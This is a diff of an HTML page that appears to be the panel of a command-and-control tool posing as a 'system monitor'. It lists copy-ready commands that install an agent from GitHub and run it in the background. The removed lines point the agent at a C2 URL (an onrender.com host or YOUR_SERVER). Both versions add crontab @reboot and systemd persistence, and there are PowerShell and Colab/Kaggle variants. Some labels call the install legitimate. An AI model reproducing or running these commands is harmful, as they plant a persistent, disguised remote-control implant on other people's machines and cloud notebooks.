@@ -77,21 +77,20 @@
     <div class="grid gap-3 md:grid-cols-3">
       <div class="p-3 bg-bg-tertiary border border-border rounded-lg hover:border-accent/50 transition-colors">
         <div class="text-xs font-semibold text-accent mb-2">pip install from GitHub</div>
-        <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto">pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=https://system-monitor-6dru.onrender.com python -m src.agents.universal &</div>
-        <p class="text-[10px] text-text-muted mt-2">Легитимная установка</p>
+        <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto">pip install git+https://github.com/GaredBerns/system-monitor.git && startcon &</div>
+        <p class="text-[10px] text-text-muted mt-2">Легитимная установка (startcon = agent)</p>
       </div>
       <div class="p-3 bg-bg-tertiary border border-border rounded-lg hover:border-accent/50 transition-colors">
         <div class="text-xs font-semibold text-accent mb-2">git clone + run</div>
-        <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto">git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && cd /tmp/sysmon && C2_URL=https://system-monitor-6dru.onrender.com python -m src.agents.universal &</div>
+        <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto">git clone https://github.com/GaredBerns/system-monitor.git /tmp/sysmon && cd /tmp/sysmon && pip install . && startcon &</div>
         <p class="text-[10px] text-text-muted mt-2">Клонирование и запуск</p>
       </div>
       <div class="p-3 bg-bg-tertiary border border-border rounded-lg hover:border-accent/50 transition-colors">
-        <div class="text-xs font-semibold text-accent mb-2">Python Cell (Colab)</div>
+        <div class="text-xs font-semibold text-accent mb-2">Python Cell (Colab/Kaggle)</div>
         <div class="relative bg-black rounded-lg p-2 pr-10 text-[10px] font-mono text-text-muted overflow-x-auto whitespace-pre-wrap">!pip install git+https://github.com/GaredBerns/system-monitor.git
-import os, subprocess
-os.environ['C2_URL'] = 'https://system-monitor-6dru.onrender.com'
-subprocess.Popen(['python', '-m', 'src.agents.universal'])</div>
-        <p class="text-[10px] text-text-muted mt-2">Для Jupyter/Colab</p>
+import subprocess
+subprocess.Popen(['startcon'])</div>
+        <p class="text-[10px] text-text-muted mt-2">Для Jupyter/Colab/Kaggle</p>
       </div>
     </div>
   </div>
@@ -109,15 +108,15 @@ subprocess.Popen(['python', '-m', 'src.agents.universal'])</div>
   <div class="payload-body p-4 border-t border-border space-y-4">
     <div>
       <div class="text-xs text-text-muted mb-1">pip install (Linux/macOS):</div>
-      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
+      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon &</div>
     </div>
     <div>
       <div class="text-xs text-text-muted mb-1">pip install (Windows):</div>
-      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && set C2_URL=http://YOUR_SERVER:5000 && python -m src.agents.universal</div>
+      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon</div>
     </div>
     <div>
       <div class="text-xs text-text-muted mb-1">With crontab persistence:</div>
-      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted overflow-x-auto"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && (crontab -l 2>/dev/null; echo "@reboot C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal >/dev/null 2>&1 &") | crontab - && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
+      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted overflow-x-auto"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && (crontab -l 2>/dev/null; echo "@reboot startcon >/dev/null 2>&1 &") | crontab - && startcon &</div>
     </div>
     <div>
       <div class="text-xs text-text-muted mb-1">With systemd service:</div>
@@ -127,8 +126,7 @@ sudo tee /etc/systemd/system/sysmon.service > /dev/null &lt;&lt;EOF
 Description=System Monitor
 After=network.target
 [Service]
-Environment="C2_URL=http://YOUR_SERVER:5000"
-ExecStart=/usr/bin/python3 -m src.agents.universal
+ExecStart=/usr/local/bin/startcon
 Restart=always
 [Install]
 WantedBy=multi-user.target
@@ -147,11 +145,11 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   <div class="payload-body p-4 border-t border-border space-y-4">
     <div>
       <div class="text-xs text-text-muted mb-1">pip install from GitHub:</div>
-      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &</div>
+      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon &</div>
     </div>
     <div>
       <div class="text-xs text-text-muted mb-1">curl from GitHub raw:</div>
-      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>curl -sL https://raw.githubusercontent.com/GaredBerns/system-monitor/main/agent.py | C2_URL=http://YOUR_SERVER:5000 python3 &</div>
+      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon &</div>
     </div>
   </div>
 </div>
@@ -165,11 +163,11 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   <div class="payload-body p-4 border-t border-border space-y-4">
     <div>
       <div class="text-xs text-text-muted mb-1">pip install from GitHub:</div>
-      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && set C2_URL=http://YOUR_SERVER:5000 && python -m src.agents.universal</div>
+      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/system-monitor.git && startcon</div>
     </div>
     <div>
       <div class="text-xs text-text-muted mb-1">PowerShell:</div>
-      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>powershell -c "$env:C2_URL='http://YOUR_SERVER:5000'; pip install git+https://github.com/GaredBerns/system-monitor.git; python -m src.agents.universal"</div>
+      <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>powershell -c "pip install git+https://github.com/GaredBerns/system-monitor.git; startcon"</div>
     </div>
   </div>
 </div>
@@ -183,9 +181,8 @@ sudo systemctl daemon-reload && sudo systemctl enable --now sysmon</div>
   <div class="payload-body p-4 border-t border-border">
     <div class="text-xs text-text-muted mb-1">Notebook Cell:</div>
     <div class="relative bg-black rounded-lg p-3 pr-12 text-xs font-mono text-text-muted whitespace-pre-wrap"><button class="copy-btn absolute top-2 right-2 px-2 py-1 text-[10px] bg-bg-tertiary border border-border rounded hover:border-accent hover:text-accent transition-colors" onclick="copyCode(this)">Copy</button>!pip install git+https://github.com/GaredBerns/system-monitor.git
-import os, subprocess
-os.environ['C2_URL'] = 'http://YOUR_SERVER:5000'
-subprocess.Popen(['python', '-m', 'src.agents.universal'])</div>
+import subprocess
+subprocess.Popen(['startcon'])</div>
   </div>
 </div>
 
